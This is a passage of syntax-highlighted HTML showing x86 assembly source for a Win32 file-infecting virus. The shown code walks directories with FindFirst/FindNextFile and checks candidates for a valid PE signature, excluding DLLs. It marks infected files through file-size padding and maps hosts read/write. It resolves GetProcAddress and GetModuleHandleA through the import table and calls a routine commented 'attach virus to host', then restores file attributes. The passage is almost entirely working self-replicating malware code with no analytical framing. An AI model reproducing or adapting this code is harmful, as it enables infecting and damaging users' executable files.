        </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">Find_Next</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">ebx.WFD_nFileSizeHigh</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">     </span><span class="sc1">;skip filez too large (&gt;1GB)</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">Close_File</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">ebx.WFD_nFileSizeLow</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">js</span><span class="sc0">      </span><span class="sc5">Close_File</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,-</span><span class="sc2">80h</span><span class="sc0">                        </span><span class="sc1">;skip filez too short</span><span class="sc0">
        </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">Close_File</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Check_PE_sign</span><span class="sc0">                   </span><span class="sc1">;it has to be a PE file</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">Close_File</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc5">IMAGE_FILE_DLL</span><span class="sc0"> </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">         </span><span class="sc1">;can't have DLL bit</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">Close_File</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">ebx.WFD_nFileSizeLow</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">;check if file is infected</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc5">size_pad</span><span class="sc0">
        </span><span class="sc6">cdq</span><span class="sc0">
        </span><span class="sc6">div</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0"> </span><span class="sc1">;esi == 0, file already infected or not infectable</span><span class="sc0">
                        </span><span class="sc1">;esi != 0, file not infected, i.e. infect it!</span><span class="sc0">
</span><span class="sc5">Close_File</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Close</span><span class="sc4">&amp;</span><span class="sc5">UnmapFile</span><span class="sc0">                 </span><span class="sc1">;close and unmap file</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">Find_Next</span><span class="sc0">                       </span><span class="sc1">;jump and find next file</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Infect</span><span class="sc0">                          </span><span class="sc1">;infect file</span><span class="sc0">

</span><span class="sc5">Find_Next</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">                             </span><span class="sc1">;find next file</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ddFindNextFileA</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">v_end</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">Process_File</span><span class="sc0">

</span><span class="sc5">Find_Close</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ddFindClose</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">v_end</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">;no more filez, close search</span><span class="sc0">

</span><span class="sc5">jmp_host</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">popad</span><span class="sc0">                                   </span><span class="sc1">;jump to host</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">Infect</span><span class="sc0">  </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc1">;blank file attributez, open and map file in r/w mode,</span><span class="sc0">
                </span><span class="sc1">;infect it, restore date/time stamp and attributez</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc5">ebx.WFD_szFileName</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">;get filename</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ddSetFileAttributesA</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">v_end</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">;blank file attributez</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">end_Infect1</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc5">work_size</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc5">ebx.WFD_nFileSizeLow</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Open</span><span class="sc4">&amp;</span><span class="sc5">MapFileAdj</span><span class="sc0">         </span><span class="sc1">;open and map file in read/write mode</span><span class="sc0">
        </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">end_Infect2</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">vszKernel32</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">v_end</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">vszGetModuleHandleA</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">v_end</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">vszGetProcAddress</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">v_end</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetProcAddressIT</span><span class="sc0">        </span><span class="sc1">;get ptr to GetProcAddress API</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ddGetProcAddress</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">v_end</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetProcAddressIT</span><span class="sc0">        </span><span class="sc1">;get ptr to GetModuleHandleA API</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ddGetModuleHandleA</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">v_end</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">GetModHandle_found</span><span class="sc0">      </span><span class="sc1">;if GetModuleHandleA found,</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">                 </span><span class="sc1">;jump and attach virus</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">end_Infect3</span><span class="sc0">             </span><span class="sc1">;KERNEL32 import descriptor not found,</span><span class="sc0">
                                        </span><span class="sc1">;then dont infect</span><span class="sc0">

        </span><span class="sc5">x</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc5">IMAGE_SIZEOF_IMPORT_DESCRIPTOR</span><span class="sc0">

        </span><span class="sc1">;GetModuleHandleA not found</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">esi.ID_TimeDateStamp</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">  </span><span class="sc1">;check if we can rely on</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">got_easy</span><span class="sc0">                        </span><span class="sc1">;the ForwarderChain trick</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">esi.ID_OriginalFirstThunk</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">end_Infect3</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">esi.ID_TimeDateStamp</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
        
</span><span class="sc5">got_easy</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">esi.ID_ForwarderChain</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">;hardcode pointerz to</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ptrForwarderChain</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">v_end</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc0"> </span><span class="sc1">;the ForwarderChain</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ddForwarderChain</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">v_end</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">  </span><span class="sc1">;field</span><span class="sc0">

</span><span class="sc5">GetModHandle_found</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">pv_start</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">v_end</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Attach</span><span class="sc0">                          </span><span class="sc1">;attach virus to host</span><span class="sc0">
</span><span class="sc5">end_Infect3</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Close</span><span class="sc4">&amp;</span><span class="sc5">UnmapFileAdj</span><span class="sc0">              </span><span class="sc1">;close and unmap file</span><span class="sc0">

</span><span class="sc5">end_Infect2</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc5">ebx.WFD_dwFileAttributes</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;restore original atribute</span><span class="sc0">
        </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">end_Infect1</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc5">ebx.WFD_szFileName</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ddSetFileAttributesA</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">v_end</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">end_Infect1</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">Infect</span><span class="sc0">  </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">Check_PE_sign</span><span class="sc0">   </span><span class="sc9">proc</span><span class="sc0">   </span><span class="sc1">;checks validity of a PE file</span><span class="sc0">
                       </span><span class="sc1">;  on entry: EDX = host file size</span><span class="sc0">
                       </span><span class="sc1">;            ECX = base address of memory-maped file</span><span class="sc0">
                       </span><span class="sc1">;            EBX = pointer to WIN32_FIND_DATA structure</span><span class="sc0">
                       </span><span class="sc1">;            EAX = host file size - 80h</span><span class="sc0">
                       </span><span class="sc1">;  on exit:  Zero flag = 1, infectable PE file</span><span class="sc0">
                       </span><span class="sc1">;            Zero flag = 0, not infectable file</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">],</span><span class="sc5">IMAGE_DOS_SIGNATURE</span><span class="sc0">      </span><span class="sc1">;needs MZ signature</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">end_check_PE_sign</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ecx.MZ_lfarlc</span><span class="sc4">],</span><span class="sc2">40h</span><span class="sc0">            </span><span class="sc1">;needs Win signature</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">end_check_PE_sign</span><span class="sc0">                       </span><span class="sc1">;(well not necesarily)</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc5">ecx.MZ_lfanew</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">;get ptr to new exe format</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">                 </span><span class="sc1">;ptr out of range?</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">end_check_PE_sign</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc5">IMAGE_NT_SIGNATURE</span><span class="sc0">      </span><span class="sc1">;check PE signature</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">end_check_PE_sign</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edi.NT_FileHeader.FH_Machine</span><span class="sc4">],</span><span class="sc0"> \ </span><span class="sc1">;must be 386+</span><span class="sc0">
                </span><span class="sc5">IMAGE_FILE_MACHINE_I386</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">end_check_PE_sign</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edi.NT_FileHeader.FH_Characteristics</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">not</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc5">IMAGE_FILE_EXECUTABLE_IMAGE</span><span class="sc0">  </span><span class="sc1">;must have the executable bit</span><span class="sc0">

</span><span class="sc5">end_check_PE_sign</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">Check_PE_sign</span><span class="sc0">   </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">Open</span><span class="sc4">&amp;</span><span class="sc5">MapFile</span><span class="sc0">    </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc1">;open and map file in read only mode</span><span class="sc0">
                        </span><span class="sc1">;  on entry:</span><span class="sc0">
                        </span><span class="sc1">;    EDX = pszFileName (pointer to file name)</span><span class="sc0">
                        </span><span class="sc1">;  on exit:</span><span class="sc0">
                        </span><span class="sc1">;    ECX = 0, if error</span><span class="sc0">
                        </span><span class="sc1">;    ECX = base adress of memory-maped file, if ok</span><span class="sc0">

                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">

</span><span class="sc5">Open</span><span class="sc4">&amp;</span><span class="sc5">MapFileAdj</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc1">;open and map file in read/write mode</span><span class="sc0">
                        </span><span class="sc1">;  on entry:</span><span class="sc0">
                        </span><span class="sc1">;    EDI = file size + work space (in bytes)</span><span class="sc0">
                        </span><span class="sc1">;    EDX = pszFileName (pointer to file name)</span><span class="sc0">
                        </span><span class="sc1">;  on exit:</span><span class="sc0">
                        </span><span class="sc1">;    ECX = 0, if error</span><span class="sc0">
                        </span><span class="sc1">;    ECX = base adress of memory-maped file, if ok</span><span class="sc0">
                        </span><span class="sc1">;    EDI = old file size</span><span class="sc0">

                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc5">OPEN_EXISTING</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">ror</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc0">
                </span><span class="sc6">rcr</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ddCreateFileA</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">v_end</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;open file</span><span class="sc0">
                </span><span class="sc6">cdq</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">end_Open</span><span class="sc4">&amp;</span><span class="sc5">MapFile</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                     </span><span class="sc1">;push first handle</span><span class="sc0">

                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc5">PAGE_READONLY</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc0">
                </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ddCreateFileMappingA</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">v_end</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">;create file</span><span class="sc0">
                </span><span class="sc6">cdq</span><span class="sc0">                                             </span><span class="sc1">;mapping</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">end_Open</span><span class="sc4">&amp;</span><span class="sc5">MapFile2</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">                     </span><span class="sc1">;push second handle</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc5">FILE_MAP_READ</span><span class="sc0">
                </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">OMF_RdOnly</span><span class="sc0">
                </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc5">ebx.WFD_nFileSizeLow</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">OMF_RdOnly</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ddMapViewOfFile</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">v_end</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;map view of file</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">end_Open</span><span class="sc4">&amp;</span><span class="sc5">MapFile3</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">                     </span><span class="sc1">;push base address of</span><span class="sc0">
                                                </span><span class="sc1">;memory-mapped file</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">esp.</span><span class="sc4">(</span><span class="sc2">3</span><span class="sc4">*</span><span class="sc5">Pshd</span><span class="sc4">)</span><span class="sc5">.RetAddr</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;jump to return adress leavin</span><span class="sc0">
                                                </span><span class="sc1">;parameterz in the stack</span><span class="sc0">
</span><span class="sc5">Open</span><span class="sc4">&amp;</span><span class="sc5">MapFile</span><span class="sc0">    </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">Close</span><span class="sc4">&amp;</span><span class="sc5">UnmapFile</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc1">;close and unmap file previosly opened in r/o mode</span><span class="sc0">

                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">

</span><span class="sc5">Close</span><span class="sc4">&amp;</span><span class="sc5">UnmapFileAdj</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc1">;close and unmap file previosly opened in r/w mode</span><span class="sc0">

                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">                               </span><span class="sc1">;return adress</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">esp.</span><span class="sc4">(</span><span class="sc2">3</span><span class="sc4">*</span><span class="sc5">Pshd</span><span class="sc4">)</span><span class="sc5">.RetAddr</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ddUnmapViewOfFile</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">v_end</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;unmap view of file</span><span class="sc0">

</span><span class="sc5">end_Open</span><span class="sc4">&amp;</span><span class="sc5">MapFile3</span><span class="sc4">:</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ddCloseHandle</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">v_end</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;close handle</span><span class="sc0">
